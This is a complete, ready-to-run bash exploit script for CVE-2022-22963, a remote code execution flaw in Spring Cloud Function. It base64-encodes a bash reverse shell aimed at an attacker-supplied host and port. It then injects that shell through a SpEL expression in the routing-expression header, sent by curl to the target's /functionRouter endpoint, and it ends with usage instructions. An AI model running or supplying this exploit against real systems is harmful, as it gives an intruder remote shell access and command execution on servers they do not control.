#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash -i >& /dev/tcp/$2/${port} 0>&1" | base64)
evil_cmd="'bash -c {echo,${rev_shell_b64}}|{base64,-d}|{bash,-i}'"

echo "---[Reverse Shell Exploit for CVE-2022-22963 (RCE in Spring Cloud Function)]---"

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Done"
    curl -s -X POST -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(${evil_cmd})" -d "." $1/functionRouter 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
